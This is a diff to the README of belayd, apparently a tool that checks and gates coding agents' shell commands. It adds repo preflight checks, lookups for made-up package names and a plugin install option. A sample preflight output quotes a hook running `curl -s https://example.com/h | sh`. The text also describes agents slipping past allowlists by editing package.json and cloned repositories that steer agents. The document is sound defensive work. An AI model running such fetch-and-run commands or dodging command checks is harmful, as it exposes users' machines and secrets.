@@ -30,7 +30,13 @@ cd your-project
 belayd init
 ```
 
-`init` finds the coding agents on your machine, shows you exactly what it will add to their settings, keeps a backup, and writes a `belayd.yaml` for the project. Restart your agent and you're covered. Nothing ever leaves your machine.
+`init` finds the coding agents on your machine, shows you exactly what it will add to their settings, keeps a backup, and writes a `belayd.yaml` for the project. Restart your agent and you're covered.
+
+Only using Claude Code? You can install belayd from inside it instead, as a plugin:
+
+```text
+/plugin install belayd --marketplace albert-canfield/belayd
+```
 
 The package is `belayd-cli` because npm thinks `belayd` looks too much like `delay`. The command it installs is plain `belayd`.
 
@@ -80,6 +86,29 @@ See why with belayd check --explain "<command>". Once belayd is on, belayd tune 
 **It notices the sneaky version.** The classic way around a command allowlist is to edit `package.json` and then run `npm test`. belayd remembers which files the agent changed in the session, and asks before it runs scripts or Git hooks from one of them. When the agent writes a Python, Node, Ruby or Perl script and then runs it, belayd reads the script first and checks the shell commands, deletes and file reads inside it.
 
 **It stays quiet until it matters.** When no rule applies, belayd says nothing and your agent behaves exactly as it did before. No fifty extra prompts a day. Your project's own scripts get the benefit of the doubt: in a script that is committed to Git and unchanged, belayd still blocks `rm -rf ~` or a read of `.env`, but doesn't question every detail it can't see. Check the claim against your own last month with `belayd scan`.
+
+**It looks at what a project brings.** A repository you just cloned can carry things that run code or steer your agent before it does anything you asked: a Git option that runs a command on every `git status`, hooks in the agent's project settings, MCP servers, subagent files, editor tasks that start when the folder opens. On the agent's first move in a project, belayd lists them and asks once. After that it stays quiet until one of them changes. `belayd preflight` shows the list any time.
+
+```console
+$ belayd preflight
+belayd preflight · cloned-repo
+Things in this project that can run code or steer an agent:
+
+  new  .git/config: core.fsmonitor makes Git run a command
+  new  .claude/settings.json: a hook runs `curl -s https://example.com/h | sh`
+  new  .mcp.json: MCP server helper runs `npx -y helper-mcp`
+
+3 new or changed since you last approved. Look at them, then: belayd preflight --approve
+```
+
+**It knows when a package name is made up.** Models invent package names, and attackers register the names they invent. Before an agent installs a package your project doesn't have yet, with `npm`, `pnpm`, `yarn`, `bun`, `pip`, `uv` or `poetry`, or runs one straight from the registry with `npx` or `uvx`, belayd looks the name up and asks when it doesn't exist or appeared in the last 30 days.
+
+```console
+$ belayd check 'npx -y @sentry-internals/profiling-node --diagnose'
+? ask  npx -y @sentry-internals/profiling-node --diagnose
+   Installs a package this project does not have yet, and its registry does not know it or only just got it. Models make up package names, and attackers register them. Check the name before it installs. (npm has no package called @sentry-internals/profiling-node) In: npx -y @sentry-internals/profiling-node --diagnose
+   rule ask-unknown-package  ·  policy: balanced preset
+```
 
 **It asks in the right place.** In an interactive Claude Code session, belayd's question shows up in Claude Code's own prompt. When nobody is watching the terminal (`claude -p`, Codex, a long background run), belayd holds the call and pings you, and you answer with `belayd approve`, on a local web page, or in a native dialog. No answer in time means no.
 
@@ -306,6 +335,7 @@ Plain words, because a safety tool that oversells itself is worse than none:
 - **Undo covers files in the project**, up to 20 MB each, for 30 days. It can't take back a push, an email, a database write or a file outside the project.
 - **Inside your own committed scripts, belayd only blocks.** A script committed to Git, unchanged, and not written by the agent in the session is treated as your code: what belayd can see there is checked as usual, what it can't see is not a question. Scripts the agent wrote or changed get the full check.
 - **It knows another agent's work from the commands it saw.** A file counts as another agent's when that agent's command named it (an edit, a write, `rm`, `sed -i`, a redirect). Files changed only as a side effect, like a lockfile rewritten by `npm install`, don't count, and an agent counts as still working for 30 minutes after its last tool call.
+- **Package lookups can come up empty.** When the registry can't be reached within 2.5 seconds, belayd says nothing about the package and the other rules decide. Packages from a private registry or index aren't looked up.
 - **The audit log is tamper-evident, not tamper-proof.** The hash chain catches accidents and casual edits. Someone with full access to your account can rebuild it.
 
 For the full reasoning, see [docs/integrations.md](docs/integrations.md) and [SECURITY.md](SECURITY.md).
@@ -341,7 +371,7 @@ No. belayd only adds friction where a rule says so. It never switches off a prom
 It blocks. A broken policy file, a crash or garbage input all end in "no", with a message pointing at `belayd doctor`.
 
 **Does it send anything anywhere?**
-No. There is no account, no telemetry and no network call. The approval page listens on 127.0.0.1 only and needs a key from your machine.
+No account, no telemetry, and nothing about your code or commands. The one network call is a lookup of a package name in its public registry (npm or PyPI), made only when an agent is about to install a package your project doesn't have yet. The install itself contacts that registry a moment later, so nobody learns anything new. Private registries are never looked up, and `packages: { check: false }` in `belayd.yaml` turns lookups off. The approval page listens on 127.0.0.1 only and needs a key from your machine.
 
 **Windows?**
 Inside WSL, yes: install belayd in the same WSL distribution your agent runs in, and it works as on any Linux. CI runs the whole test suite in Ubuntu on WSL. Agents running natively on Windows are not supported yet. Otherwise belayd runs on macOS and Linux with Node 22 or newer.
@@ -351,12 +381,12 @@ Inside WSL, yes: install belayd in the same WSL distribution your agent runs in,
 
 ## What's next
 
-Planned for 0.5, from what goes wrong when agents work in real projects:
+Planned for 0.6:
 
-- **A look before the first command.** A cloned repository can carry things that run code or steer the agent: Git options in its own config, hooks for each agent, subagent definitions, MCP servers, editor tasks. belayd will list them when an agent starts work there and ask when one is new or changed.
-- **Packages nobody has heard of.** Models make up package names, and attackers register them. belayd will ask before an agent installs a package that isn't in the lockfile and is brand new or doesn't exist.
-- **Secrets that already reached an agent.** `belayd scan` will also report keys and tokens sitting in your agents' past transcripts, so you know what to rotate.
-- **Install as a Claude Code plugin**, alongside `npm install`.
+- **An audit export** in JSONL and OpenTelemetry, for teams that collect agent logs in one place.
+- **One agent running what another wrote.** belayd asks when an agent runs a script it changed itself. Next, the same question when it runs a script another agent just wrote.
+- **Copilot CLI and Gemini CLI extensions**, so those agents can install belayd the way Claude Code now can.
+- **A page on running belayd alongside auto mode and a sandbox**, since that is how most people will use it.
 
 The longer plan, and the reasons behind it, are in [docs/plan.md](docs/plan.md#9-direction-and-roadmap). Ideas are welcome as [issues](https://github.com/albert-canfield/belayd/issues).
 
